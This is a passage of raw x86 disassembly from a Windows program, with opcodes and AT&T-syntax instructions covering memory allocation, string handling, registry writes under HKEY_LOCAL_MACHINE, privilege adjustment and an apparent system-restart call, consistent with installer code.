  401c38:	74 06                	je     0x401c40
  401c3a:	89 85 f0 f9 ff ff    	mov    %eax,-0x610(%ebp)
  401c40:	ba 80 11 40 00       	mov    $0x401180,%edx
  401c45:	8d 8d f0 f9 ff ff    	lea    -0x610(%ebp),%ecx
  401c4b:	e8 34 fe ff ff       	call   0x401a84
  401c50:	68 00 02 00 00       	push   $0x200
  401c55:	6a 40                	push   $0x40
  401c57:	ff 15 50 a1 40 00    	call   *0x40a150
  401c5d:	8b f0                	mov    %eax,%esi
  401c5f:	85 f6                	test   %esi,%esi
  401c61:	0f 84 6d 01 00 00    	je     0x401dd4
  401c67:	8b bd f0 f9 ff ff    	mov    -0x610(%ebp),%edi
  401c6d:	8b c7                	mov    %edi,%eax
  401c6f:	80 3f 00             	cmpb   $0x0,(%edi)
  401c72:	75 05                	jne    0x401c79
  401c74:	b8 04 81 40 00       	mov    $0x408104,%eax
  401c79:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  401c7f:	51                   	push   %ecx
  401c80:	6a 00                	push   $0x0
  401c82:	68 84 11 40 00       	push   $0x401184
  401c87:	50                   	push   %eax
  401c88:	ff 15 b8 a0 40 00    	call   *0x40a0b8
  401c8e:	a3 20 91 40 00       	mov    %eax,0x409120
  401c93:	8b 85 ec f9 ff ff    	mov    -0x614(%ebp),%eax
  401c99:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  401c9f:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401ca5:	50                   	push   %eax
  401ca6:	6a 08                	push   $0x8
  401ca8:	56                   	push   %esi
  401ca9:	68 40 11 40 00       	push   $0x401140
  401cae:	68 8c 11 40 00       	push   $0x40118c
  401cb3:	68 98 11 40 00       	push   $0x401198
  401cb8:	ff 15 bc a0 40 00    	call   *0x40a0bc
  401cbe:	85 c0                	test   %eax,%eax
  401cc0:	74 36                	je     0x401cf8
  401cc2:	83 0d 34 9a 40 00 04 	orl    $0x4,0x409a34
  401cc9:	80 3f 00             	cmpb   $0x0,(%edi)
  401ccc:	75 05                	jne    0x401cd3
  401cce:	bf 04 81 40 00       	mov    $0x408104,%edi
  401cd3:	57                   	push   %edi
  401cd4:	ba 04 01 00 00       	mov    $0x104,%edx
  401cd9:	8b cb                	mov    %ebx,%ecx
  401cdb:	e8 a0 f9 ff ff       	call   0x401680
  401ce0:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401ce6:	ba 00 02 00 00       	mov    $0x200,%edx
  401ceb:	50                   	push   %eax
  401cec:	8b ce                	mov    %esi,%ecx
  401cee:	e8 8d f9 ff ff       	call   0x401680
  401cf3:	e9 91 01 00 00       	jmp    0x401e89
  401cf8:	83 25 34 9a 40 00 fb 	andl   $0xfffffffb,0x409a34
  401cff:	66 83 3d 40 9a 40 00 	cmpw   $0x0,0x409a40
  401d06:	00 
  401d07:	75 1a                	jne    0x401d23
  401d09:	68 04 01 00 00       	push   $0x104
  401d0e:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401d14:	bb a0 11 40 00       	mov    $0x4011a0,%ebx
  401d19:	50                   	push   %eax
  401d1a:	50                   	push   %eax
  401d1b:	ff 15 54 a1 40 00    	call   *0x40a154
  401d21:	eb 05                	jmp    0x401d28
  401d23:	bb ac 11 40 00       	mov    $0x4011ac,%ebx
  401d28:	80 3f 00             	cmpb   $0x0,(%edi)
  401d2b:	75 05                	jne    0x401d32
  401d2d:	bf 04 81 40 00       	mov    $0x408104,%edi
  401d32:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401d38:	50                   	push   %eax
  401d39:	57                   	push   %edi
  401d3a:	53                   	push   %ebx
  401d3b:	68 b8 80 40 00       	push   $0x4080b8
  401d40:	68 00 02 00 00       	push   $0x200
  401d45:	56                   	push   %esi
  401d46:	e8 d3 f9 ff ff       	call   0x40171e
  401d4b:	83 c4 18             	add    $0x18,%esp
  401d4e:	e9 36 01 00 00       	jmp    0x401e89
  401d53:	33 c0                	xor    %eax,%eax
  401d55:	ba 25 05 00 00       	mov    $0x525,%edx
  401d5a:	50                   	push   %eax
  401d5b:	6a 10                	push   $0x10
  401d5d:	50                   	push   %eax
  401d5e:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401d64:	50                   	push   %eax
  401d65:	33 c9                	xor    %ecx,%ecx
  401d67:	e8 4d 27 00 00       	call   0x4044b9
  401d6c:	33 c0                	xor    %eax,%eax
  401d6e:	e9 21 01 00 00       	jmp    0x401e94
  401d73:	6a 2e                	push   $0x2e
  401d75:	5a                   	pop    %edx
  401d76:	8b ce                	mov    %esi,%ecx
  401d78:	e8 4b 49 00 00       	call   0x4066c8
  401d7d:	85 c0                	test   %eax,%eax
  401d7f:	74 77                	je     0x401df8
  401d81:	6a ff                	push   $0xffffffff
  401d83:	68 bc 11 40 00       	push   $0x4011bc
  401d88:	6a ff                	push   $0xffffffff
  401d8a:	50                   	push   %eax
  401d8b:	6a 01                	push   $0x1
  401d8d:	6a 7f                	push   $0x7f
  401d8f:	ff 15 68 a0 40 00    	call   *0x40a068
  401d95:	48                   	dec    %eax
  401d96:	83 e8 01             	sub    $0x1,%eax
  401d99:	75 5d                	jne    0x401df8
  401d9b:	bb 14 81 40 00       	mov    $0x408114,%ebx
  401da0:	8b cb                	mov    %ebx,%ecx
  401da2:	8d 51 01             	lea    0x1(%ecx),%edx
  401da5:	8a 01                	mov    (%ecx),%al
  401da7:	41                   	inc    %ecx
  401da8:	84 c0                	test   %al,%al
  401daa:	75 f9                	jne    0x401da5
  401dac:	2b ca                	sub    %edx,%ecx
  401dae:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  401db4:	8d 72 01             	lea    0x1(%edx),%esi
  401db7:	8a 02                	mov    (%edx),%al
  401db9:	42                   	inc    %edx
  401dba:	84 c0                	test   %al,%al
  401dbc:	75 f9                	jne    0x401db7
  401dbe:	2b d6                	sub    %esi,%edx
  401dc0:	8d 79 08             	lea    0x8(%ecx),%edi
  401dc3:	03 fa                	add    %edx,%edi
  401dc5:	57                   	push   %edi
  401dc6:	6a 40                	push   $0x40
  401dc8:	ff 15 50 a1 40 00    	call   *0x40a150
  401dce:	8b f0                	mov    %eax,%esi
  401dd0:	85 f6                	test   %esi,%esi
  401dd2:	75 0d                	jne    0x401de1
  401dd4:	33 c0                	xor    %eax,%eax
  401dd6:	ba b5 04 00 00       	mov    $0x4b5,%edx
  401ddb:	50                   	push   %eax
  401ddc:	6a 10                	push   $0x10
  401dde:	50                   	push   %eax
  401ddf:	eb 83                	jmp    0x401d64
  401de1:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401de7:	50                   	push   %eax
  401de8:	53                   	push   %ebx
  401de9:	57                   	push   %edi
  401dea:	56                   	push   %esi
  401deb:	e8 2e f9 ff ff       	call   0x40171e
  401df0:	83 c4 10             	add    $0x10,%esp
  401df3:	e9 91 00 00 00       	jmp    0x401e89
  401df8:	68 00 04 00 00       	push   $0x400
  401dfd:	6a 40                	push   $0x40
  401dff:	ff 15 50 a1 40 00    	call   *0x40a150
  401e05:	8b f0                	mov    %eax,%esi
  401e07:	85 f6                	test   %esi,%esi
  401e09:	74 c9                	je     0x401dd4
  401e0b:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401e11:	50                   	push   %eax
  401e12:	ff 15 70 a0 40 00    	call   *0x40a070
  401e18:	83 f8 ff             	cmp    $0xffffffff,%eax
  401e1b:	74 4a                	je     0x401e67
  401e1d:	a8 10                	test   $0x10,%al
  401e1f:	75 46                	jne    0x401e67
  401e21:	51                   	push   %ecx
  401e22:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401e28:	bb 00 04 00 00       	mov    $0x400,%ebx
  401e2d:	50                   	push   %eax
  401e2e:	51                   	push   %ecx
  401e2f:	8b d3                	mov    %ebx,%edx
  401e31:	8d 8d f4 f9 ff ff    	lea    -0x60c(%ebp),%ecx
  401e37:	e8 45 f9 ff ff       	call   0x401781
  401e3c:	85 ff                	test   %edi,%edi
  401e3e:	74 38                	je     0x401e78
  401e40:	80 3f 00             	cmpb   $0x0,(%edi)
  401e43:	74 33                	je     0x401e78
  401e45:	68 70 11 40 00       	push   $0x401170
  401e4a:	8b d3                	mov    %ebx,%edx
  401e4c:	8d 8d f4 f9 ff ff    	lea    -0x60c(%ebp),%ecx
  401e52:	e8 5c f8 ff ff       	call   0x4016b3
  401e57:	57                   	push   %edi
  401e58:	8b d3                	mov    %ebx,%edx
  401e5a:	8d 8d f4 f9 ff ff    	lea    -0x60c(%ebp),%ecx
  401e60:	e8 4e f8 ff ff       	call   0x4016b3
  401e65:	eb 11                	jmp    0x401e78
  401e67:	53                   	push   %ebx
  401e68:	ba 00 04 00 00       	mov    $0x400,%edx
  401e6d:	8d 8d f4 f9 ff ff    	lea    -0x60c(%ebp),%ecx
  401e73:	e8 08 f8 ff ff       	call   0x401680
  401e78:	56                   	push   %esi
  401e79:	8b d6                	mov    %esi,%edx
  401e7b:	c6 06 00             	movb   $0x0,(%esi)
  401e7e:	8d 8d f4 f9 ff ff    	lea    -0x60c(%ebp),%ecx
  401e84:	e8 23 0c 00 00       	call   0x402aac
  401e89:	8b 8d e8 f9 ff ff    	mov    -0x618(%ebp),%ecx
  401e8f:	33 c0                	xor    %eax,%eax
  401e91:	40                   	inc    %eax
  401e92:	89 31                	mov    %esi,(%ecx)
  401e94:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401e97:	5f                   	pop    %edi
  401e98:	5e                   	pop    %esi
  401e99:	33 cd                	xor    %ebp,%ecx
  401e9b:	5b                   	pop    %ebx
  401e9c:	e8 3f 4e 00 00       	call   0x406ce0
  401ea1:	8b e5                	mov    %ebp,%esp
  401ea3:	5d                   	pop    %ebp
  401ea4:	c2 08 00             	ret    $0x8
  401ea7:	8b ff                	mov    %edi,%edi
  401ea9:	55                   	push   %ebp
  401eaa:	8b ec                	mov    %esp,%ebp
  401eac:	51                   	push   %ecx
  401ead:	57                   	push   %edi
  401eae:	83 cf ff             	or     $0xffffffff,%edi
  401eb1:	83 3d 20 91 40 00 00 	cmpl   $0x0,0x409120
  401eb8:	75 1e                	jne    0x401ed8
  401eba:	66 a1 40 9a 40 00    	mov    0x409a40,%ax
  401ec0:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  401ec4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401ec7:	56                   	push   %esi
  401ec8:	8b 35 44 9a 40 00    	mov    0x409a44,%esi
  401ece:	e8 9a 06 00 00       	call   0x40256d
  401ed3:	3b f0                	cmp    %eax,%esi
  401ed5:	5e                   	pop    %esi
  401ed6:	74 03                	je     0x401edb
  401ed8:	6a 02                	push   $0x2
  401eda:	5f                   	pop    %edi
  401edb:	8b c7                	mov    %edi,%eax
  401edd:	5f                   	pop    %edi
  401ede:	8b e5                	mov    %ebp,%esp
  401ee0:	5d                   	pop    %ebp
  401ee1:	c3                   	ret
  401ee2:	8b ff                	mov    %edi,%edi
  401ee4:	55                   	push   %ebp
  401ee5:	8b ec                	mov    %esp,%ebp
  401ee7:	83 ec 18             	sub    $0x18,%esp
  401eea:	a1 04 80 40 00       	mov    0x408004,%eax
  401eef:	33 c5                	xor    %ebp,%eax
  401ef1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ef4:	57                   	push   %edi
  401ef5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401ef8:	50                   	push   %eax
  401ef9:	6a 28                	push   $0x28
  401efb:	ff 15 90 a1 40 00    	call   *0x40a190
  401f01:	50                   	push   %eax
  401f02:	ff 15 14 a0 40 00    	call   *0x40a014
  401f08:	33 ff                	xor    %edi,%edi
  401f0a:	85 c0                	test   %eax,%eax
  401f0c:	75 15                	jne    0x401f23
  401f0e:	ba f5 04 00 00       	mov    $0x4f5,%edx
  401f13:	57                   	push   %edi
  401f14:	6a 10                	push   $0x10
  401f16:	57                   	push   %edi
  401f17:	57                   	push   %edi
  401f18:	33 c9                	xor    %ecx,%ecx
  401f1a:	e8 9a 25 00 00       	call   0x4044b9
  401f1f:	33 c0                	xor    %eax,%eax
  401f21:	eb 5e                	jmp    0x401f81
  401f23:	56                   	push   %esi
  401f24:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401f27:	50                   	push   %eax
  401f28:	68 c4 11 40 00       	push   $0x4011c4
  401f2d:	57                   	push   %edi
  401f2e:	ff 15 20 a0 40 00    	call   *0x40a020
  401f34:	57                   	push   %edi
  401f35:	57                   	push   %edi
  401f36:	57                   	push   %edi
  401f37:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401f3a:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  401f41:	50                   	push   %eax
  401f42:	57                   	push   %edi
  401f43:	ff 75 e8             	push   -0x18(%ebp)
  401f46:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  401f4d:	ff 15 34 a0 40 00    	call   *0x40a034
  401f53:	ff 75 e8             	push   -0x18(%ebp)
  401f56:	8b f0                	mov    %eax,%esi
  401f58:	ff 15 88 a0 40 00    	call   *0x40a088
  401f5e:	85 f6                	test   %esi,%esi
  401f60:	5e                   	pop    %esi
  401f61:	57                   	push   %edi
  401f62:	75 07                	jne    0x401f6b
  401f64:	ba f6 04 00 00       	mov    $0x4f6,%edx
  401f69:	eb a9                	jmp    0x401f14
  401f6b:	6a 02                	push   $0x2
  401f6d:	ff 15 d8 a1 40 00    	call   *0x40a1d8
  401f73:	85 c0                	test   %eax,%eax
  401f75:	75 07                	jne    0x401f7e
  401f77:	ba f7 04 00 00       	mov    $0x4f7,%edx
  401f7c:	eb 95                	jmp    0x401f13
  401f7e:	33 c0                	xor    %eax,%eax
  401f80:	40                   	inc    %eax
  401f81:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401f84:	33 cd                	xor    %ebp,%ecx
  401f86:	5f                   	pop    %edi
  401f87:	e8 54 4d 00 00       	call   0x406ce0
  401f8c:	8b e5                	mov    %ebp,%esp
  401f8e:	5d                   	pop    %ebp
  401f8f:	c3                   	ret
  401f90:	8b ff                	mov    %edi,%edi
  401f92:	53                   	push   %ebx
  401f93:	8b d9                	mov    %ecx,%ebx
  401f95:	f6 c3 02             	test   $0x2,%bl
  401f98:	75 0a                	jne    0x401fa4
  401f9a:	e8 08 ff ff ff       	call   0x401ea7
  401f9f:	83 f8 02             	cmp    $0x2,%eax
  401fa2:	75 35                	jne    0x401fd9
  401fa4:	f6 c3 04             	test   $0x4,%bl
  401fa7:	75 1c                	jne    0x401fc5
  401fa9:	6a 04                	push   $0x4
  401fab:	6a 40                	push   $0x40
  401fad:	6a 00                	push   $0x0
  401faf:	68 40 11 40 00       	push   $0x401140
  401fb4:	ba 22 05 00 00       	mov    $0x522,%edx
  401fb9:	33 c9                	xor    %ecx,%ecx
  401fbb:	e8 f9 24 00 00       	call   0x4044b9
  401fc0:	83 f8 06             	cmp    $0x6,%eax
  401fc3:	75 14                	jne    0x401fd9
  401fc5:	66 83 3d 40 9a 40 00 	cmpw   $0x0,0x409a40
  401fcc:	00 
  401fcd:	75 0c                	jne    0x401fdb
  401fcf:	6a 00                	push   $0x0
  401fd1:	6a 02                	push   $0x2
  401fd3:	ff 15 d8 a1 40 00    	call   *0x40a1d8
  401fd9:	5b                   	pop    %ebx
  401fda:	c3                   	ret
  401fdb:	5b                   	pop    %ebx
  401fdc:	e9 01 ff ff ff       	jmp    0x401ee2
  401fe1:	8b ff                	mov    %edi,%edi
  401fe3:	55                   	push   %ebp
  401fe4:	8b ec                	mov    %esp,%ebp
  401fe6:	51                   	push   %ecx
  401fe7:	80 3d 30 85 40 00 00 	cmpb   $0x0,0x408530
  401fee:	74 36                	je     0x402026
  401ff0:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401ff3:	50                   	push   %eax
  401ff4:	68 06 00 02 00       	push   $0x20006
  401ff9:	6a 00                	push   $0x0
  401ffb:	68 70 80 40 00       	push   $0x408070
  402000:	68 02 00 00 80       	push   $0x80000002
  402005:	ff 15 08 a0 40 00    	call   *0x40a008
  40200b:	85 c0                	test   %eax,%eax
  40200d:	75 17                	jne    0x402026
  40200f:	68 30 85 40 00       	push   $0x408530
  402014:	ff 75 fc             	push   -0x4(%ebp)
  402017:	ff 15 04 a0 40 00    	call   *0x40a004
  40201d:	ff 75 fc             	push   -0x4(%ebp)
  402020:	ff 15 30 a0 40 00    	call   *0x40a030
  402026:	8b e5                	mov    %ebp,%esp
  402028:	5d                   	pop    %ebp
  402029:	c3                   	ret
  40202a:	8b ff                	mov    %edi,%edi
  40202c:	55                   	push   %ebp
  40202d:	8b ec                	mov    %esp,%ebp
  40202f:	81 ec 18 02 00 00    	sub    $0x218,%esp
  402035:	a1 04 80 40 00       	mov    0x408004,%eax
  40203a:	33 c5                	xor    %ebp,%eax
  40203c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40203f:	53                   	push   %ebx
  402040:	57                   	push   %edi
  402041:	bf 04 01 00 00       	mov    $0x104,%edi
  402046:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40204c:	57                   	push   %edi
  40204d:	6a 00                	push   $0x0
  40204f:	50                   	push   %eax
  402050:	e8 5a 52 00 00       	call   0x4072af
  402055:	57                   	push   %edi
  402056:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  40205c:	6a 00                	push   $0x0
  40205e:	50                   	push   %eax
  40205f:	e8 4b 52 00 00       	call   0x4072af
  402064:	83 c4 18             	add    $0x18,%esp
  402067:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  40206d:	33 c9                	xor    %ecx,%ecx
  40206f:	8b d9                	mov    %ecx,%ebx
  402071:	50                   	push   %eax
  402072:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402078:	50                   	push   %eax
  402079:	51                   	push   %ecx
  40207a:	68 1f 00 02 00       	push   $0x2001f
  40207f:	51                   	push   %ecx
  402080:	51                   	push   %ecx
  402081:	51                   	push   %ecx
  402082:	68 70 80 40 00       	push   $0x408070
  402087:	68 02 00 00 80       	push   $0x80000002
  40208c:	ff 15 1c a0 40 00    	call   *0x40a01c
  402092:	85 c0                	test   %eax,%eax
  402094:	0f 85 bd 01 00 00    	jne    0x402257
  40209a:	56                   	push   %esi
  40209b:	33 f6                	xor    %esi,%esi
  40209d:	56                   	push   %esi
  40209e:	68 a4 80 40 00       	push   $0x4080a4
  4020a3:	6a 50                	push   $0x50
  4020a5:	68 30 85 40 00       	push   $0x408530
  4020aa:	e8 6f f6 ff ff       	call   0x40171e
  4020af:	83 c4 10             	add    $0x10,%esp
  4020b2:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  4020b8:	50                   	push   %eax
  4020b9:	33 c0                	xor    %eax,%eax
  4020bb:	50                   	push   %eax
  4020bc:	50                   	push   %eax
  4020bd:	50                   	push   %eax
  4020be:	68 30 85 40 00       	push   $0x408530
  4020c3:	ff b5 f0 fd ff ff    	push   -0x210(%ebp)
  4020c9:	ff 15 28 a0 40 00    	call   *0x40a028
  4020cf:	85 c0                	test   %eax,%eax
  4020d1:	75 09                	jne    0x4020dc
  4020d3:	46                   	inc    %esi
  4020d4:	81 fe c8 00 00 00    	cmp    $0xc8,%esi
  4020da:	7c c1                	jl     0x40209d
  4020dc:	81 fe c8 00 00 00    	cmp    $0xc8,%esi
  4020e2:	75 17                	jne    0x4020fb
  4020e4:	ff b5 f0 fd ff ff    	push   -0x210(%ebp)
  4020ea:	ff 15 30 a0 40 00    	call   *0x40a030
  4020f0:	88 1d 30 85 40 00    	mov    %bl,0x408530
  4020f6:	e9 5b 01 00 00       	jmp    0x402256
  4020fb:	57                   	push   %edi
  4020fc:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  402102:	50                   	push   %eax
  402103:	ff 15 74 a0 40 00    	call   *0x40a074
  402109:	68 d8 11 40 00       	push   $0x4011d8
  40210e:	8b d7                	mov    %edi,%edx
  402110:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
  402116:	e8 6f 44 00 00       	call   0x40658a
  40211b:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  402121:	50                   	push   %eax
  402122:	ff 15 78 a0 40 00    	call   *0x40a078
  402128:	8b f8                	mov    %eax,%edi
  40212a:	85 ff                	test   %edi,%edi
  40212c:	74 4b                	je     0x402179
  40212e:	68 e4 11 40 00       	push   $0x4011e4
  402133:	57                   	push   %edi
  402134:	ff 15 9c a0 40 00    	call   *0x40a09c
  40213a:	8b f0                	mov    %eax,%esi
  40213c:	33 db                	xor    %ebx,%ebx
  40213e:	85 f6                	test   %esi,%esi
  402140:	57                   	push   %edi
  402141:	0f 95 c3             	setne  %bl
  402144:	ff 15 ac a0 40 00    	call   *0x40a0ac
  40214a:	85 f6                	test   %esi,%esi
  40214c:	74 2b                	je     0x402179
  40214e:	be 04 01 00 00       	mov    $0x104,%esi
  402153:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402159:	56                   	push   %esi
  40215a:	50                   	push   %eax
  40215b:	ff 15 74 a0 40 00    	call   *0x40a074
  402161:	85 c0                	test   %eax,%eax
  402163:	74 31                	je     0x402196
  402165:	68 40 11 40 00       	push   $0x401140
  40216a:	8b d6                	mov    %esi,%edx
  40216c:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  402172:	e8 13 44 00 00       	call   0x40658a
  402177:	eb 1d                	jmp    0x402196
  402179:	be 04 01 00 00       	mov    $0x104,%esi
  40217e:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402184:	56                   	push   %esi
  402185:	50                   	push   %eax
  402186:	ff 35 3c 9a 40 00    	push   0x409a3c
  40218c:	ff 15 9c a1 40 00    	call   *0x40a19c
  402192:	85 c0                	test   %eax,%eax
  402194:	74 48                	je     0x4021de
  402196:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  40219c:	8d 51 01             	lea    0x1(%ecx),%edx
  40219f:	8a 01                	mov    (%ecx),%al
  4021a1:	41                   	inc    %ecx
  4021a2:	84 c0                	test   %al,%al
  4021a4:	75 f9                	jne    0x40219f
  4021a6:	2b ca                	sub    %edx,%ecx
  4021a8:	ba e4 91 40 00       	mov    $0x4091e4,%edx
  4021ad:	8d 72 01             	lea    0x1(%edx),%esi
  4021b0:	8a 02                	mov    (%edx),%al
  4021b2:	42                   	inc    %edx
  4021b3:	84 c0                	test   %al,%al
  4021b5:	75 f9                	jne    0x4021b0
  4021b7:	2b d6                	sub    %esi,%edx
  4021b9:	8d 79 50             	lea    0x50(%ecx),%edi
  4021bc:	03 fa                	add    %edx,%edi
  4021be:	57                   	push   %edi
  4021bf:	6a 40                	push   $0x40
  4021c1:	ff 15 50 a1 40 00    	call   *0x40a150
  4021c7:	8b f0                	mov    %eax,%esi
  4021c9:	85 f6                	test   %esi,%esi
  4021cb:	75 1f                	jne    0x4021ec
  4021cd:	50                   	push   %eax
  4021ce:	6a 10                	push   $0x10
  4021d0:	50                   	push   %eax
  4021d1:	50                   	push   %eax
  4021d2:	ba b5 04 00 00       	mov    $0x4b5,%edx
  4021d7:	33 c9                	xor    %ecx,%ecx
  4021d9:	e8 db 22 00 00       	call   0x4044b9
  4021de:	ff b5 f0 fd ff ff    	push   -0x210(%ebp)
  4021e4:	ff 15 30 a0 40 00    	call   *0x40a030
  4021ea:	eb 6a                	jmp    0x402256
  4021ec:	8b c3                	mov    %ebx,%eax
  4021ee:	83 f0 01             	xor    $0x1,%eax
  4021f1:	a3 80 85 40 00       	mov    %eax,0x408580
  4021f6:	b8 40 80 40 00       	mov    $0x408040,%eax
  4021fb:	85 db                	test   %ebx,%ebx
  4021fd:	75 05                	jne    0x402204
  4021ff:	b8 2c 81 40 00       	mov    $0x40812c,%eax
  402204:	68 e4 91 40 00       	push   $0x4091e4
  402209:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  40220f:	51                   	push   %ecx
  402210:	50                   	push   %eax
  402211:	57                   	push   %edi
  402212:	56                   	push   %esi
  402213:	e8 06 f5 ff ff       	call   0x40171e
  402218:	8b ce                	mov    %esi,%ecx
  40221a:	83 c4 14             	add    $0x14,%esp
  40221d:	8d 51 01             	lea    0x1(%ecx),%edx
  402220:	8a 01                	mov    (%ecx),%al
  402222:	41                   	inc    %ecx
  402223:	84 c0                	test   %al,%al
  402225:	75 f9                	jne    0x402220
  402227:	2b ca                	sub    %edx,%ecx
  402229:	8d 41 01             	lea    0x1(%ecx),%eax
  40222c:	50                   	push   %eax
  40222d:	56                   	push   %esi
  40222e:	6a 01                	push   $0x1
  402230:	6a 00                	push   $0x0
  402232:	68 30 85 40 00       	push   $0x408530
  402237:	ff b5 f0 fd ff ff    	push   -0x210(%ebp)
  40223d:	ff 15 18 a0 40 00    	call   *0x40a018
  402243:	ff b5 f0 fd ff ff    	push   -0x210(%ebp)
  402249:	ff 15 30 a0 40 00    	call   *0x40a030
  40224f:	56                   	push   %esi
  402250:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  402256:	5e                   	pop    %esi
  402257:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40225a:	5f                   	pop    %edi
  40225b:	33 cd                	xor    %ebp,%ecx
  40225d:	5b                   	pop    %ebx
  40225e:	e8 7d 4a 00 00       	call   0x406ce0
  402263:	8b e5                	mov    %ebp,%esp
  402265:	5d                   	pop    %ebp
  402266:	c3                   	ret
  402267:	8b ff                	mov    %edi,%edi
  402269:	55                   	push   %ebp
  40226a:	8b ec                	mov    %esp,%ebp
  40226c:	81 ec 48 03 00 00    	sub    $0x348,%esp
  402272:	a1 04 80 40 00       	mov    0x408004,%eax
  402277:	33 c5                	xor    %ebp,%eax
  402279:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40227c:	80 3d 30 85 40 00 00 	cmpb   $0x0,0x408530
  402283:	0f 84 f9 00 00 00    	je     0x402382
  402289:	56                   	push   %esi
  40228a:	8d 85 bc fc ff ff    	lea    -0x344(%ebp),%eax
  402290:	33 f6                	xor    %esi,%esi
  402292:	50                   	push   %eax
  402293:	68 1f 00 02 00       	push   $0x2001f
  402298:	56                   	push   %esi
  402299:	68 70 80 40 00       	push   $0x408070
  40229e:	68 02 00 00 80       	push   $0x80000002
  4022a3:	ff 15 08 a0 40 00    	call   *0x40a008
  4022a9:	85 c0                	test   %eax,%eax
  4022ab:	0f 85 d0 00 00 00    	jne    0x402381
  4022b1:	53                   	push   %ebx
  4022b2:	8d 85 b8 fc ff ff    	lea    -0x348(%ebp),%eax
  4022b8:	bb 38 02 00 00       	mov    $0x238,%ebx
  4022bd:	50                   	push   %eax
  4022be:	8d 85 c0 fc ff ff    	lea    -0x340(%ebp),%eax
  4022c4:	89 9d b8 fc ff ff    	mov    %ebx,-0x348(%ebp)
  4022ca:	50                   	push   %eax
  4022cb:	56                   	push   %esi
  4022cc:	56                   	push   %esi
  4022cd:	68 30 85 40 00       	push   $0x408530
  4022d2:	ff b5 bc fc ff ff    	push   -0x344(%ebp)
  4022d8:	ff 15 28 a0 40 00    	call   *0x40a028
  4022de:	85 c0                	test   %eax,%eax
  4022e0:	0f 85 8e 00 00 00    	jne    0x402374
  4022e6:	57                   	push   %edi
  4022e7:	bf 04 01 00 00       	mov    $0x104,%edi
  4022ec:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4022f2:	57                   	push   %edi
  4022f3:	56                   	push   %esi
  4022f4:	50                   	push   %eax
  4022f5:	e8 b5 4f 00 00       	call   0x4072af
  4022fa:	83 c4 0c             	add    $0xc,%esp
  4022fd:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402303:	57                   	push   %edi
  402304:	50                   	push   %eax
  402305:	ff 15 74 a0 40 00    	call   *0x40a074
  40230b:	85 c0                	test   %eax,%eax
  40230d:	74 12                	je     0x402321
  40230f:	68 40 11 40 00       	push   $0x401140
  402314:	8b d7                	mov    %edi,%edx
  402316:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  40231c:	e8 69 42 00 00       	call   0x40658a
  402321:	68 e4 91 40 00       	push   $0x4091e4
  402326:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  40232c:	50                   	push   %eax
  40232d:	68 40 80 40 00       	push   $0x408040
  402332:	8d 85 c0 fc ff ff    	lea    -0x340(%ebp),%eax
  402338:	53                   	push   %ebx
  402339:	50                   	push   %eax
  40233a:	e8 df f3 ff ff       	call   0x40171e
  40233f:	83 c4 14             	add    $0x14,%esp
  402342:	8d 8d c0 fc ff ff    	lea    -0x340(%ebp),%ecx
  402348:	8d 51 01             	lea    0x1(%ecx),%edx
  40234b:	5f                   	pop    %edi
  40234c:	8a 01                	mov    (%ecx),%al
  40234e:	41                   	inc    %ecx
  40234f:	84 c0                	test   %al,%al
  402351:	75 f9                	jne    0x40234c
  402353:	2b ca                	sub    %edx,%ecx
  402355:	8d 41 01             	lea    0x1(%ecx),%eax
  402358:	50                   	push   %eax
  402359:	8d 85 c0 fc ff ff    	lea    -0x340(%ebp),%eax
  40235f:	50                   	push   %eax
  402360:	6a 01                	push   $0x1
  402362:	56                   	push   %esi
  402363:	68 30 85 40 00       	push   $0x408530
  402368:	ff b5 bc fc ff ff    	push   -0x344(%ebp)
  40236e:	ff 15 18 a0 40 00    	call   *0x40a018
  402374:	ff b5 bc fc ff ff    	push   -0x344(%ebp)
  40237a:	ff 15 30 a0 40 00    	call   *0x40a030
  402380:	5b                   	pop    %ebx
  402381:	5e                   	pop    %esi
  402382:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402385:	33 cd                	xor    %ebp,%ecx
